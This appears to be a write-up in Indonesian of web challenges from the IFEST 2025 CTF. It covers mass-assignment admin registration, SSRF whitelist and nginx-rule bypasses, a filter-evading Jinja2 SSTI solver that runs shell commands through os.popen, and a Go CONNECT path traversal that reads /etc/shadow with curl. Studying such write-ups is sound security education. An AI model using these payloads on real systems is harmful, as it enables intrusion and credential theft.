[{"title":"IFEST 2025 CTF Writeup","url":"/2025/05/27/IFEST-2025-CTF-Writeup/","content":"QUALWeb ExploitationWeb V1Kode Python tersebut mengambil input dari pengguna melalui berbagai parameter, lalu membuat akun pengguna berdasarkan parameter yang diberikan. Pada class User, terdapat atribut is_admin. Dengan menambahkan parameter is_admin=1, kita dapat mendaftarkan akun sebagai admin secara langsung.\n\nRegister account, tambahin parameter is_admin=1.\n\nPada endpoint /admin/fetch terdapat celah SSRF, di mana mekanisme whitelist-nya tidak aman. Sistem hanya memeriksa apakah string daffainfo.com terdapat dalam URL yang dikirimkan. Dengan memanfaatkan kelemahan ini, kita dapat menyisipkan daffainfo.com sebagai query parameter, sehingga URL seperti http://127.0.0.1:1337/internal?daffainfo.com tetap lolos validasi dan kita bisa akses ke layanan internal.\n\nlangsung kita ngerequest ke /admin/fetch endpoint dengan url parameter http://127.0.0.1:1337/internal?daffainfo.com.\nBypassParameter title, akan dicheck dengan blacklist, jika aman akan masuk ke function render_template_string.\n\nSalah satu proof of concept SSTI adalah &#123;&#123;7*7&#125;&#125; akan dievaluasi sebagai 49, akan tetapi karakter &#123;&#123;` dan `&#125;&#125; diblacklist.\n\nNah ternyata masih ada proof of concept lainnya, yaitu dengan menggunakan &#123;% if 7*7==49 %&#125; 49 &#123;% endif %&#125;\nWaktunya ngebypass blacklistnya untuk mendapatkan RCE. Nah aku ada resource untuk dapetin payload SSTI (https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)\nWaktunya bikin solver.\nimport requestsfrom bs4 import BeautifulSoupfrom urllib.parse import quotedef solver(url):    # Cat flag and save it to static/testing12312    payload = r&quot;&quot;&quot;&#123;% if request|attr(&#x27;\\x61pplication&#x27;)|attr(&#x27;\\x5f\\x5fglobals\\x5f\\x5f&#x27;)|attr(&#x27;\\x5f\\x5fgetitem\\x5f\\x5f&#x27;)(&#x27;\\x5f\\x5f\\x62uiltins\\x5f\\x5f&#x27;)|attr(&#x27;\\x5f\\x5fgetitem\\x5f\\x5f&#x27;)(&#x27;\\x5f\\x5fi\\x6dport\\x5f\\x5f&#x27;)(&#x27;o\\x73&#x27;)|attr(&#x27;popen&#x27;)(&#x27;cat reward/fl\\x2a &gt;&gt; static/testing12312&#x27;) %&#125; a &#123;%endif%&#125;&quot;&quot;&quot;    trigger_ssti(url, payload)    # Read flag    res = requests.get(f&quot;&#123;url&#125;/static/testing12312&quot;)    print(res.text) # IFEST13&#123;SSTI_byp4ss_f1lt3rs_to_w1n_R3W4RD&#125;    # Delete static/testing12312 file (supaya tidak ada unintended buat orang lain)    payload = r&quot;&quot;&quot;&#123;% if request|attr(&#x27;\\x61pplication&#x27;)|attr(&#x27;\\x5f\\x5fglobals\\x5f\\x5f&#x27;)|attr(&#x27;\\x5f\\x5fgetitem\\x5f\\x5f&#x27;)(&#x27;\\x5f\\x5f\\x62uiltins\\x5f\\x5f&#x27;)|attr(&#x27;\\x5f\\x5fgetitem\\x5f\\x5f&#x27;)(&#x27;\\x5f\\x5fi\\x6dport\\x5f\\x5f&#x27;)(&#x27;o\\x73&#x27;)|attr(&#x27;popen&#x27;)(&#x27;rm static/testing12312&#x27;) %&#125; a &#123;%endif%&#125;&quot;&quot;&quot;    trigger_ssti(url, payload)def trigger_ssti(url, payload):    url = f&quot;&#123;url&#125;/?title=&#123;quote(payload)&#125;&quot;    res = requests.get(url)    res = BeautifulSoup(res.text,&#x27;html.parser&#x27;).find(&#x27;h1&#x27;, class_=&#x27;display-4 fst-italic&#x27;)    print(res)if __name__ == &quot;__main__&quot;:    url = &quot;http://103.163.139.198:8888&quot;    solver(url)\n\n\nOrbiterzzxxMelakukan directory fuzzing, dan menemukan file /phpinfo.php\n\nDitemukan credentials buat login dan flag part 1.\n\nFlag part-1: 345Y_P34SY\nDitemukan flag part 2 pada jwt cookieFlag part-2: _L3M0N_\nTerdapat command injection, dan ditemukan flag part 3 pada file true_flag.txt\nFlag part-3: 5QU332Y\nFinal flag: IFEST13&#123;345Y_P34SY_L3M0N_5QU332Y!!!&#125;\nFINALWeb ExploitationWeb v2User(**data) disini vulnerable, user bisa kasih parameter is_admin=1 dan bisa keregister sebagai admin.\n\nBerhasil register dengan role admin.\n\nSelanjutnya kita pengen ke /admin/fetch untuk melakukan SSRF, akan tetapi terdapat proteksi pada nginxnya. Ketika kita ke situ bakalan langsung di block.\n\nSesuai dengan source yang saya dapatkan (https://blog.1nf1n1ty.team/hacktricks/pentesting-web/proxy-waf-protections-bypass), konfigurasi itu vulnerable dimana attacker bisa ngebypass rules tersebut dengan menambahkan special character pada requestnya.\nKarena nginx server menggunakan version 1.22.0, dan backendnya adalah Flask, maka karakter special itu adalah \\x85 atau \\xA0.\n\nTinggal bikin request di burpsuite, dan tambahkan \\x85 setelah /admin/fetch\n\nBerhasil ngebypass rules nginx.\n\nPada saat ingin melakukan ssrf ke /internal, terdapat proteksi dimana url yang kita berikan akan diparse menggunakan urlparse, dan akan dicek hostnamenya.\n\nKita dapat membypass proteksi itu dengan memberi \\@daffainfo.com, dimana urlparse akan menganggap hostnamenya adalah daffainfo.com.\n\nSetelah itu akan digunakan requests.get, dimana requests.get akan menganggap \\@daffainfo.com sebagai url path.\n\nSehingga kita pake path traversal saja untuk menghilangkan /%5C@daffainfo.com itu\n\nDan berhasil solp ðŸ˜€\n\nPixelPlaza2Function staticHandler berikut vulnerable terhadap path traversal\n\nKenapa bisa path traversal? Normalnya url itu dinormalize, tetapi jika HTTP methodnya adalah CONNECT, go ini tidak ngenormalize urlnya.\nhttps://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/golang.html?highlight=path%20traversal%20proc#connect-method\nDengan command\ncurl &quot;http://103.163.139.198:8888/../../../etc/shadow&quot; -X CONNECT --path-as-is\n\nkita berhasil melihat isi &#x2F;etc&#x2F;shadow file.\n\nAwalnya saya mencari-cari default files, config files, &#x2F;proc&#x2F;self&#x2F;environ untuk mencari jalan menuju fleg, akan tetapi tidak membuahkan hasil.\nPada saat saya mengunjungi /about.html, terdapat url menuju /docs/text, Nah filenya itu ga ada\n\nNah ternyata directory docs itu ada di directory sebelumnya.\nSehingga dapet deh flagnya\ncurl &quot;http://103.163.139.198:8888/../docs/text&quot; -X CONNECT --path-as-is\n\n\n","categories":["National CTF"],"tags":["nginx_misconfiguration","url_parser_discrepancies","path_traversal"]}]